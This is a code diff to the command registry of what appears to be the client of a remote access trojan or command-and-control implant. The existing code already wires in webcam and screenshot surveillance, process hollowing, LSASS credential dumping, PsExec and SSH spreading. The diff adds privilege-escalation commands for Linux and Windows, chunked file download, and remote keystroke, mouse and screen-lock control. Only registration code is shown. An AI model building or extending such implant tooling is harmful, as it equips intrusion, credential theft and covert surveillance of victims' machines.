@@ -1,6 +1,6 @@
 from client.core.command_registry import CommandRegistry
 from client.commands.file_commands import LsCommand, CdCommand, PwdCommand, RmCommand, MvCommand, CatCommand, TouchCommand
-from client.commands.transfer_commands import UploadCommand, DownloadCommand
+from client.commands.transfer_commands import UploadCommand, DownloadCommand, ChunkedDownloadCommand
 from client.commands.shell_commands import PsCommand, IfconfigCommand, KillCommand, PkillCommand, GrepCommand
 from client.commands.system_commands import SysinfoCommand, CheckAdminCommand, ClipboardCommand
 from client.commands.surveillance_commands import ScreenshotCommand, WebcamCommand
@@ -15,6 +15,8 @@ from client.commands.stealth_commands import (
     HollowCommand, MigrateCommand, LsassDumpCommand, Socks5Command,
     ScanCommand, PsexecCommand, SSHSprdCommand,
 )
+from client.commands.privesc_commands import PrivescLinuxCommand, PrivescWindowsCommand
+from client.commands.rat_commands import KeystrokeCommand, MouseCommand, ClickCommand, LockScreenCommand
 
 
 def build_client_registry() -> CommandRegistry:
@@ -28,6 +30,7 @@ def build_client_registry() -> CommandRegistry:
     registry.register(TouchCommand())
     registry.register(UploadCommand())
     registry.register(DownloadCommand())
+    registry.register(ChunkedDownloadCommand())
     registry.register(PsCommand())
     registry.register(IfconfigCommand())
     registry.register(KillCommand())
@@ -67,4 +70,10 @@ def build_client_registry() -> CommandRegistry:
     registry.register(ScanCommand())
     registry.register(PsexecCommand())
     registry.register(SSHSprdCommand())
+    registry.register(PrivescLinuxCommand())
+    registry.register(PrivescWindowsCommand())
+    registry.register(KeystrokeCommand())
+    registry.register(MouseCommand())
+    registry.register(ClickCommand())
+    registry.register(LockScreenCommand())
     return registry
